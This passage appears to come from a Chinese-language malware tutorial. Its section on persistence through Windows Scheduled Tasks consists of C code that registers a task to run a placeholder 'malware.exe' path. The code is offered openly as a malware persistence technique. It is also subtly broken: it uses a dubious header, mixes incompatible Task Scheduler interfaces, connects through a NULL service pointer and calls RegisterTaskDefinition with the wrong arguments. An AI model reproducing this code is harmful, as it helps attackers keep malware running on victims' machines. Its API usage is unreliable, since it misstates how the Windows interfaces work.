#### **B. 通过Scheduled Tasks持久化**
```c
// 创建定时任务（使用Task Scheduler API）
#include <sapicl.h>
#include <stdio.h>

BOOL CreateScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    ITaskScheduler* pScheduler = NULL;
    hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void**)&pScheduler);
    if (FAILED(hr)) {
        CoUninitialize();
        return FALSE;
    }

    ITaskService* pService = NULL;
    hr = pScheduler->Connect(pService, BIND_NATIVE | BIND_IMPERSONATE);
    if (FAILED(hr)) {
        pScheduler->Release();
        CoUninitialize();
        return FALSE;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(TS_FOLDER_ROOT, &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        pScheduler->Release();
        CoUninitialize();
        return FALSE;
    }

    IRegisteredTask* pTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        TEXT("MyPersistentTask"), // 任务名称
        TEXT("MyPersistentTask"), // 任务路径
        TASK_CREATE_OR_UPDATE,     // 创建或更新
        NULL,                      // 任务ID（NULL表示自动生成）
        NULL,                      // 任务触发器（NULL表示立即运行）
        TEXT("C:\\path\\to\\malware.exe"), // 程序路径
        NULL,                      // 工作目录（NULL表示默认）
        TEXT(""),                  // 用户名（NULL表示当前用户）
        TEXT(""),                  // 密码（NULL表示无密码）
        TASK_LOGON_INTERACTIVE_TOKEN, // 登录类型
        &pTask
    );

    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    pScheduler->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}
